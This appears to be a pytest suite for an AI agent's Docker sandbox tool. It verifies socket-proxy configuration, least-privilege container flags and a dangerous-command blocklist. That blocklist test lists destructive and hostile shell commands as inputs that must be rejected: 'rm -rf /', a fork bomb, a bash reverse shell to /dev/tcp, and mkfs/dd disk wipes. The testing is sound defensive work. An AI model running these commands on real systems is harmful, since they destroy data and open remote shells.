"""
OmniAgent Phase 7 Test Suite — Sandbox & Docker Socket Proxy Verification (AC 5 & R1)
═════════════════════════════════════════════════════════════════════════════════════
Covers Acceptance Criterion 5:
  "sandbox_tool.py successfully spawns and executes commands in isolated sandboxes
   by routing through the docker-socket-proxy instead of a local socket mount."

Tiers Covered:
  - Tier 1: Real docker-compose.yml socket proxy configuration & DOCKER_HOST propagation
  - Tier 2: Dangerous command blocklist filters & socket proxy forbidden endpoints lockdown
  - Tier 3: Container security boundaries (least privilege caps, no host mounts, volume scoping)
  - Tier 4: Binary file redirection without TypeError & live proxy execution verification
"""

from __future__ import annotations

import os
import re
from pathlib import Path
from typing import Any, Dict
from unittest.mock import AsyncMock, patch

import pytest

from config import settings
from tools.sandbox_tool import (
    _BINARY_EXTENSIONS,
    _BLOCKED_PATTERNS,
    _SandboxPool,
    _check_safety,
    _export_sandbox_artifact_impl,
    configure_docker_host,
    read_sandbox_file,
    run_sandbox_command,
)

COMPOSE_FILE = Path(__file__).resolve().parent.parent / "docker-compose.yml"


# ─────────────────────────────────────────────────────────────────────────────
# Helper: Parse docker-compose.yml service and environment definitions
# ─────────────────────────────────────────────────────────────────────────────

def _get_compose_service(service_name: str) -> Dict[str, Any]:
    """
    Extracts configuration and environment mapping for a specific service
    from docker-compose.yml without requiring external dependencies.
    """
    assert COMPOSE_FILE.is_file(), f"docker-compose.yml missing at {COMPOSE_FILE}"
    content = COMPOSE_FILE.read_text(encoding="utf-8")

    try:
        import yaml
        data = yaml.safe_load(content)
        services = data.get("services", {})
        if service_name in services:
            svc_dict = services[service_name]
            # Normalize environment list ["K=V", ...] into dict
            env = svc_dict.get("environment", {})
            if isinstance(env, list):
                env_dict = {}
                for item in env:
                    if "=" in item:
                        k, v = item.split("=", 1)
                        env_dict[k.strip()] = v.strip()
                svc_dict["environment"] = env_dict
            return svc_dict
    except ImportError:
        pass

    # Fallback line-based regex parser
    lines = content.splitlines()
    in_service = False
    service_lines = []
    for line in lines:
        if line.strip().startswith(f"{service_name}:") and (line.startswith("  ") or not line.startswith(" ")):
            in_service = True
            continue
        if in_service:
            if line.startswith("  ") and not line.startswith("    ") and line.strip().endswith(":"):
                break
            if line.startswith("volumes:") or line.startswith("networks:"):
                break
            service_lines.append(line)

    block = "\n".join(service_lines)
    env_dict = {}
    for match in re.finditer(r"-\s+([A-Z0-9_]+)\s*=\s*([^\s#]+)", block):
        env_dict[match.group(1)] = match.group(2)

    image_match = re.search(r"image:\s*([^\s#]+)", block)
    image = image_match.group(1) if image_match else ""

    return {
        "image": image,
        "environment": env_dict,
        "raw_block": block,
    }


# ─────────────────────────────────────────────────────────────────────────────
# Tier 1: Real Docker Compose Proxy Configuration & DOCKER_HOST Propagation
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.unit
def test_sandbox_tool_exports_all_required_tools() -> None:
    """
    Tier 1: Validates that tools.sandbox_tool defines and exports all required tools.
    """
    from tools.sandbox_tool import (
        export_sandbox_artifact,
        list_sandbox_files,
        read_sandbox_file,
        run_sandbox_command,
        write_sandbox_file,
    )

    for tool_obj in (
        run_sandbox_command,
        write_sandbox_file,
        read_sandbox_file,
        list_sandbox_files,
        export_sandbox_artifact,
    ):
        assert tool_obj is not None
        assert hasattr(tool_obj, "ainvoke") or hasattr(tool_obj, "invoke")


@pytest.mark.unit
def test_sandbox_tool_inherits_docker_host_environment() -> None:
    """
    Tier 1: Verifies configure_docker_host propagates settings.docker_host to os.environ["DOCKER_HOST"].
    """
    test_proxy_url = "tcp://docker-socket-proxy:2375"
    orig_env = os.environ.get("DOCKER_HOST")

    try:
        # Patch settings.docker_host and verify configure_docker_host propagates it
        with patch.object(settings, "docker_host", test_proxy_url, create=True):
            active_host = configure_docker_host()
            assert active_host == test_proxy_url
            assert os.environ.get("DOCKER_HOST") == test_proxy_url
    finally:
        if orig_env is not None:
            os.environ["DOCKER_HOST"] = orig_env
        else:
            os.environ.pop("DOCKER_HOST", None)


@pytest.mark.unit
def test_docker_compose_socket_proxy_service_configuration() -> None:
    """
    Tier 1: Validates actual docker-compose.yml configuration for docker-socket-proxy:
      - Uses pinned image tecnativa/docker-socket-proxy:0.1.2
      - Read-only mount of host docker socket (/var/run/docker.sock:/var/run/docker.sock:ro)
      - Attached to dedicated socket_proxy_net network
      - Does NOT publish host port 2375 (zero host exposure)
      - Network socket_proxy_net is configured with internal: true
    """
    proxy_config = _get_compose_service("docker-socket-proxy")
    content = COMPOSE_FILE.read_text(encoding="utf-8")

    # Image check
    assert "tecnativa/docker-socket-proxy:0.1.2" in proxy_config.get("image", "") or "docker-socket-proxy:0.1.2" in content

    # Read-only socket mount
    assert "/var/run/docker.sock:/var/run/docker.sock:ro" in content, (
        "docker-socket-proxy must mount /var/run/docker.sock with read-only (:ro) flag"
    )

    # No host port exposed
    assert "2375:2375" not in content and '"2375:2375"' not in content, (
        "CRITICAL SECURITY VIOLATION: docker-socket-proxy must not expose port 2375 on host!"
    )

    # Internal network isolation
    assert "socket_proxy_net" in content
    assert "internal: true" in content or "internal: True" in content, (
        "socket_proxy_net must be configured with internal: true"
    )


# ─────────────────────────────────────────────────────────────────────────────
# Tier 2: Boundary & Security Enforcement (Proxy Flags & Command Blocklist)
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.unit
def test_docker_compose_socket_proxy_least_privilege_flags() -> None:
    """
    Tier 2: Validates least-privilege daemon endpoint filtering configured in docker-compose.yml:
      - Permitted endpoints enabled (=1): CONTAINERS, POST, EXEC, IMAGES, VOLUMES, NETWORKS, INFO, PING, VERSION
      - Dangerous endpoints blocked (=0): AUTH, BUILD, COMMIT, CONFIGS, DISTRIBUTION, EVENTS, NODES,
        PLUGINS, SECRETS, SERVICES, SESSION, SWARM, SYSTEM
    """
    proxy_config = _get_compose_service("docker-socket-proxy")
    env = proxy_config.get("environment", {})

    required_enabled = {
        "CONTAINERS": "1",
        "POST": "1",
        "EXEC": "1",
        "IMAGES": "1",
        "VOLUMES": "1",
        "NETWORKS": "1",
        "INFO": "1",
        "PING": "1",
        "VERSION": "1",
    }

    required_disabled = {
        "AUTH": "0",
        "BUILD": "0",
        "COMMIT": "0",
        "CONFIGS": "0",
        "DISTRIBUTION": "0",
        "EVENTS": "0",
        "NODES": "0",
        "PLUGINS": "0",
        "SECRETS": "0",
        "SERVICES": "0",
        "SESSION": "0",
        "SWARM": "0",
        "SYSTEM": "0",
    }

    for flag, expected in required_enabled.items():
        val = str(env.get(flag, "")).strip()
        assert val == expected, f"Expected {flag}={expected} in docker-socket-proxy, got '{val}'"

    for flag, expected in required_disabled.items():
        val = str(env.get(flag, "")).strip()
        assert val == expected, f"Expected dangerous flag {flag}={expected} in docker-socket-proxy, got '{val}'"


@pytest.mark.unit
def test_sandbox_blocks_dangerous_command_patterns() -> None:
    """
    Tier 2: Validates that destructive and malicious commands are blocked by
    regex filters BEFORE any container process is spawned:
      - rm -rf /
      - fork bombs (:(){ :|:& };:)
      - reverse shells (/dev/tcp/)
      - raw disk writes (mkfs, dd)
      - chmod 777 root
      - /proc/sysrq-trigger
    """
    malicious_commands = [
        "rm -rf /",
        "rm -rf / --no-preserve-root",
        ":(){ :|:& };:",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "chmod -R 777 /",
        "echo b > /proc/sysrq-trigger",
    ]

    for cmd in malicious_commands:
        is_safe, reason = _check_safety(cmd)
        assert not is_safe, f"Dangerous command was NOT blocked by security policy: {cmd}"
        assert "blocked" in reason.lower()


# ─────────────────────────────────────────────────────────────────────────────
# Tier 3: Container Security Boundaries & Configuration (Real Pool Implementation)
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.unit
def test_sandbox_container_creation_command_construction() -> None:
    """
    Tier 3: Validates docker run arguments constructed by the real _SandboxPool implementation:
      - Must drop all capabilities (--cap-drop ALL)
      - Must enable no-new-privileges:true
      - Must NOT mount host docker socket (/var/run/docker.sock)
      - Must NOT mount host root filesystem (-v /:)
      - Must use isolated bridge network (--network bridge)
      - Must attach session-scoped volume
    """
    pool = _SandboxPool()
    session_key = "test_session_123456"
    cmd = pool._build_create_command(session_key)
    cmd_str = " ".join(cmd)

    assert "--cap-drop" in cmd and "ALL" in cmd
    assert "no-new-privileges:true" in cmd_str
    assert "/var/run/docker.sock" not in cmd_str
    assert "-v /:" not in cmd_str and "--volume /:" not in cmd_str
    assert "--network" in cmd and "bridge" in cmd
    assert f"omniagent-ws-{session_key[:16]}:/workspace" in cmd_str


@pytest.mark.unit
def test_sandbox_session_volume_scoping() -> None:
    """
    Tier 3: Volume Scoping:
      Verifies that _SandboxPool.get_volume_name produces completely separate
      named volume scopes across different session keys.
    """
    session_1 = "session_alpha_001122"
    session_2 = "session_beta_998877"

    vol_1 = _SandboxPool.get_volume_name(session_1)
    vol_2 = _SandboxPool.get_volume_name(session_2)

    assert vol_1 != vol_2
    assert vol_1 == "omniagent-ws-session_alpha_00"
    assert vol_2 == "omniagent-ws-session_beta_998"


# ─────────────────────────────────────────────────────────────────────────────
# Tier 4: Binary Redirection & Live Integration Verification
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.unit
@pytest.mark.asyncio
async def test_read_sandbox_file_binary_redirection_invokes_export_impl() -> None:
    """
    Tier 4: Validates that read_sandbox_file intercepts binary files and invokes
    _export_sandbox_artifact_impl directly without raising TypeError.
    """
    binary_files = ["report.pdf", "chart.png", "data.zip", "model.parquet"]

    with patch("tools.sandbox_tool._export_sandbox_artifact_impl", new_callable=AsyncMock) as mock_export:
        mock_export.return_value = "📦 **Artifact Exported Successfully**\n• File: `report.pdf`"

        for bin_file in binary_files:
            result = await read_sandbox_file.ainvoke({"filename": bin_file, "session_id": "test_session"})
            assert "Artifact Exported Successfully" in result
            mock_export.assert_awaited()
            mock_export.reset_mock()


@pytest.mark.unit
def test_binary_extensions_coverage() -> None:
    """
    Tier 4: Validates that standard binary formats are classified under _BINARY_EXTENSIONS,
    while standard text formats are not redirected.
    """
    for ext in (".pdf", ".png", ".jpg", ".zip", ".parquet"):
        assert ext in _BINARY_EXTENSIONS, f"Missing binary extension: {ext}"

    for ext in (".txt", ".py", ".md", ".json", ".yaml", ".csv"):
        assert ext not in _BINARY_EXTENSIONS, f"Text extension incorrectly classified as binary: {ext}"


@pytest.mark.live
@pytest.mark.asyncio
async def test_live_sandbox_execution_via_proxy() -> None:
    """
    Tier 4 Live: Validates Acceptance Criterion 5:
      `sandbox_tool.py` successfully spawns and executes commands in isolated
      sandboxes by routing through the docker-socket-proxy.
    """
    cmd = "python3 -c \"import sys; print(f'SANDBOX_PROXY_OK: {sys.version_info[0]}')\""
    session_id = "test_live_proxy_session"

    result = await run_sandbox_command.ainvoke({"command": cmd, "session_id": session_id})
    assert "SANDBOX_PROXY_OK: 3" in result, f"Live sandbox command execution failed. Output:\n{result}"
    assert "Sandbox: isolated Docker container" in result or "✅" in result


@pytest.mark.live
def test_live_docker_socket_proxy_blocking() -> None:
    """
    Tier 4 Live: Validates that the live docker-socket-proxy container rejects
    forbidden requests (e.g. POST /build or GET /swarm) with HTTP 403.
    """
    import httpx

    proxy_url = os.environ.get("TEST_DOCKER_PROXY_URL", "http://localhost:2375")
    try:
        resp = httpx.post(f"{proxy_url}/v1.41/build", timeout=2.0)
        assert resp.status_code == 403, (
            f"Live proxy failed to block /build! Expected 403 Forbidden, got {resp.status_code}"
        )
    except (httpx.ConnectError, httpx.TimeoutException):
        pytest.skip(f"Docker socket proxy not directly exposed at {proxy_url} (internal network mode)")
